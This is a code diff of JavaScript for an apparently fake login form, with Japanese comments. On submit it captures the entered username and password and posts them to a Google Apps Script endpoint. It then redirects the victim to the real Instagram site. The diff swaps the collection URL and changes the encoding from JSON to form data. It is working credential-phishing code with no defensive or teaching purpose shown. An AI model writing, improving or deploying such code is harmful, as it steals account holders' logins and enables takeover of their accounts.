@@ -4,27 +4,26 @@ document.getElementById("login-form").addEventListener("submit", function(e) {
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
 
-    // Google Apps Scriptに送信（★ここが重要）
-    fetch("https://script.google.com/macros/s/AKfycbxl8RgZaGHVI5DngnM3Pw-sS2HVwhYexx8jtRzIPiSSZ4SjD0k2ksJmY5gOtEcr6Zqxbg/exec", {
+    const formData = new FormData();
+    formData.append("username", username);
+    formData.append("password", password);
+
+    fetch("https://script.google.com/macros/s/AKfycbwGdVgIZfmVVwTY2OUXy9gMEdIxbX2X9VMREip9daPsdP_XEDrs6MA97r_7tkcAswLJQg/exec", {
         method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            username: username,
-            password: password
-        })
+        body: formData
     })
-    .then(response => response.text())
-    .then(data => {
-        console.log("送信成功:", data);
-        // ログイン成功として好きな場所にリダイレクト
-        window.location.href = "https://www.instagram.com/";
+    .then(response => {
+        if (response.ok) {
+            // 成功後のリダイレクト先
+            window.location.href = "https://www.instagram.com/";
+        } else {
+            alert("送信に失敗しました（レスポンスNG）");
+        }
     })
     .catch(error => {
-        console.error("送信エラー:", error);
-        alert("送信に失敗しました。");
+        alert("送信エラー：" + error);
+        console.error(error);
     });
 
-    this.reset(); // フォームをリセット
+    this.reset();
 });
